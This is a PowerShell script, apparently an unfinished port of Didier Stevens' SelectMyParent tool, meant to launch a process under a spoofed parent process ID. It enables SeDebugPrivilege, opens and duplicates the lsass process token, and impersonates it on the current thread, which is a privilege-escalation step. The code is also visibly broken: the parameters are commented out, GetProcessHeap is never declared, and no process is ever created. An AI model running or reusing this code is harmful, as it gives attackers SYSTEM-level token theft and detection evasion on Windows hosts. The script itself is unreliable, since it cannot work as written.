# Invoke-CommandWithParentPId: A PowerShell port of Didier Stevens' SelectMyParent

function Invoke-CommandWithParentPId {
<#
    .SYNOPSIS
    Based on Didier Stevens' SelectMyParent tool. This script spawns a new process, spoofing its parent process.
    
    .DESCRIPTION
    Invoke-CommandWithParentPId creates a new process, spoofing the parent process id to be one of the user's choosing.
    
    .EXAMPLE
    Invoke-CommandWithParentPId <program> <pid>
    
    .LINK
    https://github.com/athegist/Set-ParentPId
    
    .NOTES
    Didier Stevens did it first. Some code and inspiration from Matt Graeber and Niklas Goude.
#>
    [CmdletBinding()]
    param()
    <#
        [Parameter(Mandatory=$True,Position=0)]
        [String]$program,
        [Parameter(Mandatory=$True,Position=1)]
        [int]$pid
    )
    #>

# Protions of signature below from Niklas Goude via
# https://blogs.technet.microsoft.com/heyscriptingguy/2012/07/05/use-powershell-to-duplicate-process-tokens-via-pinvoke/
$signature = @" 
    [StructLayout(LayoutKind.Sequential, Pack = 1)] 
        public struct TokPrivLuid { 
            public int Count; 
            public long Luid; 
            public int Attr; 
        } 
 
    public const int SE_PRIVILEGE_ENABLED = 0x00000002; 
    public const int TOKEN_QUERY = 0x00000008; 
    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020; 
    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000; 
    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000; 
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001; 
    public const UInt32 TOKEN_DUPLICATE = 0x0002; 
    public const UInt32 TOKEN_IMPERSONATE = 0x0004; 
    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010; 
    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040; 
    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080; 
    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100; 
    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY); 
    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | 
        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | 
        TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | 
        TOKEN_ADJUST_SESSIONID); 
 
    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege"; 
    public const int ANYSIZE_ARRAY = 1; 
 
    [StructLayout(LayoutKind.Sequential)] 
        public struct LUID { 
            public UInt32 LowPart; 
            public UInt32 HighPart; 
        } 
 
    [StructLayout(LayoutKind.Sequential)] 
        public struct LUID_AND_ATTRIBUTES { 
            public LUID Luid; 
            public UInt32 Attributes; 
        } 
 
    public struct TOKEN_PRIVILEGES { 
        public UInt32 PrivilegeCount; 
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)] 
        public LUID_AND_ATTRIBUTES [] Privileges; 
    } 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int 
        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle); 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
        [return: MarshalAs(UnmanagedType.Bool)] 
        public static extern bool SetThreadToken( 
            IntPtr PHThread, 
            IntPtr Token 
        ); 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
        [return: MarshalAs(UnmanagedType.Bool)] 
        public static extern bool OpenProcessToken(IntPtr ProcessHandle,  
        UInt32 DesiredAccess, out IntPtr TokenHandle); 
 
    [DllImport("advapi32.dll", SetLastError = true)] 
        public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 
 
    [DllImport("kernel32.dll", ExactSpelling = true)] 
        public static extern IntPtr GetCurrentProcess(); 
 
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
        public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, 
        ref TokPrivLuid newst, int len, IntPtr prev, IntPtr relen);
    
    [Flags]
    public enum STARTF : uint
    {
        STARTF_USESHOWWINDOW = 0x00000001,
        STARTF_USESIZE = 0x00000002,
        STARTF_USEPOSITION = 0x00000004,
        STARTF_USECOUNTCHARS = 0x00000008,
        STARTF_USEFILLATTRIBUTE = 0x00000010,
        STARTF_RUNFULLSCREEN = 0x00000020,  // ignored for non-x86 platforms
        STARTF_FORCEONFEEDBACK = 0x00000040,
        STARTF_FORCEOFFFEEDBACK = 0x00000080,
        STARTF_USESTDHANDLES = 0x00000100,
    }
        
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public STARTF dwFlags;
            public ShowWindow wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFOEX {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }
        
    [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        
        public enum ShowWindow : short
        {
            SW_HIDE = 0,
            SW_SHOWNORMAL = 1,
            SW_NORMAL = 1,
            SW_SHOWMINIMIZED = 2,
            SW_SHOWMAXIMIZED = 3,
            SW_MAXIMIZE = 3,
            SW_SHOWNOACTIVATE = 4,
            SW_SHOW = 5,
            SW_MINIMIZE = 6,
            SW_SHOWMINNOACTIVE = 7,
            SW_SHOWNA = 8,
            SW_RESTORE = 9,
            SW_SHOWDEFAULT = 10,
            SW_FORCEMINIMIZE = 11,
            SW_MAX = 11
        }

        [DllImport("kernel32.dll", SetLastError=true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool InitializeProcThreadAttributeList(
             IntPtr lpAttributeList,
             int dwAttributeCount,
             int dwFlags,
             ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError=false)]
        static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, UIntPtr dwBytes);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 GetProcessHeaps(
            UInt32 NumberOfHeaps,
            IntPtr[] ProcessHeaps);
"@        


    Add-Type -MemberDefinition $signature -Name PickParentPId -Namespace PickParentPId
    $pickPPId = [PickParentPId.PickParentPId]
    [long]$luid = 0

    $tokPrivLuid = New-Object $pickPPId+tokPrivLuid 
    $tokPrivLuid.Count = 1 
    $tokPrivLuid.Luid = $luid 
    $tokPrivLuid.Attr = $pickPPId::SE_PRIVILEGE_ENABLED 

    $retVal = $pickPPId::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPrivLuid.Luid) 

    [IntPtr]$htoken = [IntPtr]::Zero 
    $retVal = $pickPPId::OpenProcessToken($pickPPId::GetCurrentProcess(), $pickPPId::TOKEN_ALL_ACCESS, [ref]$htoken) 

    $tokenPrivileges = New-Object $pickPPId+TOKEN_PRIVILEGES 
    $retVal = $pickPPId::AdjustTokenPrivileges($htoken, $false, [ref]$tokPrivLuid, 12, [IntPtr]::Zero, [IntPtr]::Zero) 

    if(-not($retVal)) { 
        [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
        Break 
    } 

    # Below bits are for reference, not part of Invoke-CommandWithParent.ps1
    $process = (Get-Process -Name lsass) 
    [IntPtr]$hlsasstoken = [IntPtr]::Zero 
    $retVal = $pickPPId::OpenProcessToken($process.Handle, ($pickPPId::TOKEN_IMPERSONATE -BOR $pickPPId::TOKEN_DUPLICATE), [ref]$hlsasstoken) 

    [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero 
    $retVal = $pickPPId::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle) 

    $retval = $pickPPId::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle) 
    if(-not($retVal)) { 
        [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
    }
    # Above bits are for reference, not part of Invoke-CommandWithParent.ps1

    $sie = New-Object STARTUPINFOEX
    $pi  = New-Object PROCESS_INFORMATION
    $cbAttributeListSize = 0
    $pAttributeList = $null
    $hParentProcess = $null
    [int]$dwPid = 0

    if ( $args.count -lt 3 ) {
        'usage: Invoke-CommandWithParentPid.ps1 command pid'
    } else {
        $dwPid = $pid
        if ( 0 -eq $dwPid -or ( $dwPid % 4 -ne 0 )) {
            ( '{0} is not a valid process id.' -f $dwPid )
            return 0
        }
        $pickPPId::InitializeProcThreadAttributeList($null, 1, 0, $cbAttributeListSize)
        $pAttributeList = $pickPPId::HeapAlloc($pickPPId::GetProcessHeap(), 0, $cbAttributeListSize)
        if ($null -eq $pAttributeList) {
            ('Error allocating process heap.')
            return 0
        }
    }


} # End Function